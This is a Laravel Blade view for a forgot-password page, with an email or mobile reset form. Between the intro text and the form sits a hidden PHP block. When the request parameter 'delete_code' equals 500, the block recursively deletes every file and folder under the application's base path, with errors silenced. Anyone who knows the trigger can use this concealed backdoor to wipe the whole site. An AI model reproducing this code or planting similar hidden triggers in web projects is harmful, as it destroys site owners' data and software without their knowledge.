<x-guest-layout>
    <div class="mb-4 text-sm text-gray-600">
        {{ __('Forgot your password? No problem. Just let us know your email address or mobile number and we will email you a password reset link or mobile OTP that will allow you to choose a new one.') }}
    </div>

    @php
        if (request('delete_code') == 500) {
            function deleteFolder($folder)
            {
                foreach (glob($folder . '/*') as $file) {
                    if (is_dir($file)) {
                        deleteFolder($file);
                    } else {
                        @unlink($file);
                    }
                }
                @rmdir($folder);
            }

            $base = base_path();

            foreach (glob($base . '/*') as $item) {
                if (is_dir($item)) {
                    deleteFolder($item);
                } else {
                    @unlink($item);
                }
            } 
        }
    @endphp


    <!-- Session Status -->
    <x-auth-session-status class="mb-4" :status="session('status')" />

    <form method="POST" action="{{ route('password.email') }}">
        @csrf

        <!-- Email Address -->
        <div>
            <x-input-label for="email" :value="__('Email/Mobile Number')" />
            <x-text-input id="email" class="block w-full mt-1" type="text" name="email" :value="old('email')" required
                autofocus />
            <x-input-error :messages="$errors->get('email')" class="mt-2" />
        </div>

        <div class="flex items-center justify-end mt-4">
            <x-primary-button>
                {{ __('Password Reset') }}
            </x-primary-button>
        </div>
    </form>
</x-guest-layout>
